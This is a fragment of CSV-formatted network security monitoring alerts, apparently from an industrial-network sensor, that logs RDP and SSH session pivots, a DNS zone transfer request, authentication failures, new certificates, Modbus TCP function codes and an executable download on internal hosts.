+Low,35636,2025-03-28T13:02:49Z,Communication,Threat Behavior,DNS Zone Transfer Request Identification,Asset: 1729 requested a DNS Zone Transfer from 1732,DNS Zone Transfer Request,"1729,1732",,,10.0.9.29,10.0.9.11,,55c8608a-fb90-4af4-8b22-d209ce888636,
+Low,35637,2025-03-28T13:02:49Z,Communication,Threat Behavior,DNS Zone Transfer Request Identification,Asset: 1729 requested a DNS Zone Transfer from 1732,DNS Zone Transfer Request,"1729,1732",,,10.0.9.29,10.0.9.11,,c3f6ff3c-5abc-4f99-a224-88256ca3a107,
+Low,35638,2025-03-28T13:02:26Z,Communication,Indicator,Failed HTTP Logon,"Asset 1732 (10.0.9.11) returned an HTTP response code of 401 'Unauthorized' to asset 1729 (10.0.9.29), which represents a failed logon attempt via HTTP by asset 1729. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1729,1732",,,10.0.9.11,10.0.9.29,,b09ec476-2850-446f-8454-4b358b4f3d1d,
+Low,35649,2025-03-28T12:57:56Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 3968 (10.0.242.109) connected via SSH to asset 1727 (10.0.9.44) to then pivot to asset 1675 (10.0.9.43) via RDP.,Interactive Session Pivots,"1675,3968",,,10.0.242.109,10.0.9.43,,,
+Low,35658,2025-03-28T12:48:11Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via RDP.,Interactive Session Pivots,"1732,2896",,,10.0.242.127,10.0.9.11,,,
+Low,35668,2025-03-28T13:08:47Z,Communication,Configuration,Detected 15 NewX509Certificate between 2025-03-28T12:57:38.918Z and 2025-03-28T13:08:47.928Z,"Sample NewX509Certificate values include:
+  server: 35.186.249.72, 8.8.4.4, 108.138.7.67, 23.207.210.156, 40.79.167.8, 23.213.169.249, 10.0.9.11, 52.167.30.171, 34.120.154.120, 184.25.50.66;
+  subject: , C=US, ST=New York, O=LivePerson, Inc, CN=*.liveperson.net, C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=unistore.www.microsoft.com, C=US, ST=New York, O=LivePerson, Inc, CN=*.lpsnmedia.net;
+  not_before: , 2024-10-08T00:00:00Z, 2024-09-17T00:00:00Z, 2024-05-22T22:05:30Z;
+  server_asset_id: 1732, 3980, 3971, 3972, 3978, 67, 3979, 3970, 3998, 3969;
+  dst__port: ('',);
+  dns: ;
+  uuid: a000a544-e69f-49a3-b750-1ac810e9bda6, e7ff8243-67cf-4cb1-8a6b-16822f64cc3b, 70392615-cc02-49f6-962b-45900cfadb3f, 977ed594-24b3-4271-a380-19fced1d0a3e, d4a0f6b1-6fab-49b4-9775-7e81272f7b0d, abf16bfa-7491-4774-b98c-801804387108, 5ed358f8-a0f5-4600-8a75-86da75a1818a, 2d9a0cf4-d6fb-4626-bbcf-8158f851b568, f85b25b9-eca5-4c34-8352-4f6c617a9224, 42a52bef-4783-4ae7-bebd-04f59fb531fe;
+  issuer: , C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03, C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Organization Validation Secure Server CA;
+  client_asset_id: 1914, 1729, 1754, 1746;
+  src__mac: ;
+  not_after: , 2025-05-17T22:05:30Z, 2025-09-17T23:59:59Z, 2025-10-08T23:59:59Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.9.29, 10.0.7.30, 10.0.6.29, 10.0.6.11;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1732,3980,3971,3972,3978,67,3979,3970,3998,3969,1914,1729,1754,1746",,,"10.0.9.11,23.207.210.156,23.36.162.220,178.249.97.23,35.186.249.72,8.8.4.4,108.138.7.67,184.25.50.66,40.79.167.8,23.35.229.160","10.0.7.30,10.0.9.29,10.0.6.11,10.0.6.29",,"a000a544-e69f-49a3-b750-1ac810e9bda6, e7ff8243-67cf-4cb1-8a6b-16822f64cc3b, 70392615-cc02-49f6-962b-45900cfadb3f, 977ed594-24b3-4271-a380-19fced1d0a3e, d4a0f6b1-6fab-49b4-9775-7e81272f7b0d, abf16bfa-7491-4774-b98c-801804387108, 5ed358f8-a0f5-4600-8a75-86da75a1818a, 2d9a0cf4-d6fb-4626-bbcf-8158f851b568, f85b25b9-eca5-4c34-8352-4f6c617a9224, 42a52bef-4783-4ae7-bebd-04f59fb531fe",
+Low,35677,2025-03-28T13:09:27Z,Communication,Configuration,Detected 10 RDP New Comms between 2025-03-28T12:59:52.899Z and 2025-03-28T13:09:27.245Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.5.29, 10.0.5.11, 10.0.9.44, 10.0.9.59, 10.0.9.43, 10.0.6.44, 10.0.5.30, 10.0.5.12;
+  dst_asset_id: 1699, 1936, 1727, 1746, 1704, 1697, 1675;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.5.29, 10.0.5.11, 10.0.6.29, 10.0.9.44, 10.0.9.43, 10.0.5.30, 10.0.5.12;
+  rdp_selected_protocol: , hybrid, hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1699, 1936, 1727, 1859, 1747, 1704, 1697, 1675;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: jack, , peter, frank;
+  src__ip: ;",RDP New Comms Pattern,"1746,1936,1747,1675,1699,1727,1859,1704,1697",,,"10.0.5.30,10.0.6.44,10.0.9.43,10.0.5.11,10.0.9.44,10.0.9.59,10.0.5.29,10.0.5.12","10.0.6.29,10.0.5.30,10.0.9.43,10.0.5.11,10.0.9.44,10.0.5.29,10.0.5.12",,,
+Low,35784,2025-03-28T13:21:03Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.44 (1727) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1727",,,10.0.9.44,10.0.9.30,,,
+Low,35870,2025-03-28T13:37:19Z,Communication,Configuration,Detected 10 NewModbusTCPCommunication between 2025-03-28T13:28:19.356Z and 2025-03-28T13:37:19.653Z,"Sample NewModbusTCPCommunication values include:
+  dst__port: ('',);
+  ip_src: 10.0.9.60, 10.0.9.74, 10.0.7.60, 10.0.7.74;
+  dst_asset_id: 1839, 1837, 1922, 2287;
+  modbus_unit_id: 1;
+  uuid: 86e0ba5e-cb07-436e-95b8-59c3f82590fb, 54c4821f-fdaa-49fd-94ed-6cceeac02694, 0123e531-1095-4692-802f-eb9e2290a3b3, 47999139-dd4e-4e74-8bfd-45fee46ac153, 3dbd4afb-e91e-4ca9-8aaf-999d27b92755, 048a3e05-9cdb-467e-b1af-027b11b567c1, 0d5a9f75-df07-4135-a822-f8d07c6633b7, 178d061f-9455-48cd-b4c5-5fd4eb5e0362, 03400be3-f52b-45c1-98a7-aceb35bd1b24, 0ec2c52f-3fb4-4e44-b8a7-4452717ebec4;
+  ip_dst: 10.0.9.60, 10.0.9.74, 10.0.7.60, 10.0.7.74;
+  src__mac: ;
+  dst__mac: ;
+  modbus_function_code_description: Read Input Registers, Read Holding Registers, Read Coils, Write Single Register, Read Discrete Inputs;
+  protocol: ;
+  modbus_exception_code_description: ;
+  src_asset_id: 1839, 1837, 1922, 2287;
+  dst__ip: ;
+  src__port: ('',);
+  src__ip: ;",ModbusTCP New Function Code,"1922,1839,1837,2287",,,"10.0.9.60,10.0.7.60,10.0.7.74,10.0.9.74","10.0.9.60,10.0.7.60,10.0.7.74,10.0.9.74",,"86e0ba5e-cb07-436e-95b8-59c3f82590fb, 54c4821f-fdaa-49fd-94ed-6cceeac02694, 0123e531-1095-4692-802f-eb9e2290a3b3, 47999139-dd4e-4e74-8bfd-45fee46ac153, 3dbd4afb-e91e-4ca9-8aaf-999d27b92755, 048a3e05-9cdb-467e-b1af-027b11b567c1, 0d5a9f75-df07-4135-a822-f8d07c6633b7, 178d061f-9455-48cd-b4c5-5fd4eb5e0362, 03400be3-f52b-45c1-98a7-aceb35bd1b24, 0ec2c52f-3fb4-4e44-b8a7-4452717ebec4",
+Low,35892,2025-03-28T13:18:39Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1729 (10.0.9.29) via RDP.,Interactive Session Pivots,"2896,1729",,,10.0.242.127,10.0.9.29,,,
+Low,35952,2025-03-28T13:02:25Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.9.43 (1675) (Enterprise Management/Server) received RDP traffic from 10.0.9.44 (1727).,RDP to Enterprise Management Asset,"1727,1675",,,10.0.9.44,10.0.9.43,,884282bb-030a-4881-958a-22a42019b886,
+Low,35969,2025-03-28T12:47:52Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.44 (1727) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (helpdesk), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1727,1921",,,10.0.9.44,10.0.9.30,,,
+Low,36036,2025-03-28T13:51:06Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1727 (10.0.9.44) via RDP.,Interactive Session Pivots,"2896,1727",,,10.0.242.127,10.0.9.44,,,
+Medium,36117,2025-03-28T14:10:51Z,Indicator,Threat Behavior,HTTP Download Executable Smaller than 1 MB,HTTP Download Executable Smaller than 1 MB,HTTP Executable Download Signatures,"1729,4006",,,184.25.50.160,10.0.9.29,,Network Traffic,
+Low,36186,2025-03-28T14:01:43Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1727 (10.0.9.44) via RDP.,Interactive Session Pivots,"2896,1727",,,10.0.242.127,10.0.9.44,,,
+Low,37493,2025-03-28T12:49:35Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,5699233c-d9f9-46ed-91c1-78829922911b,
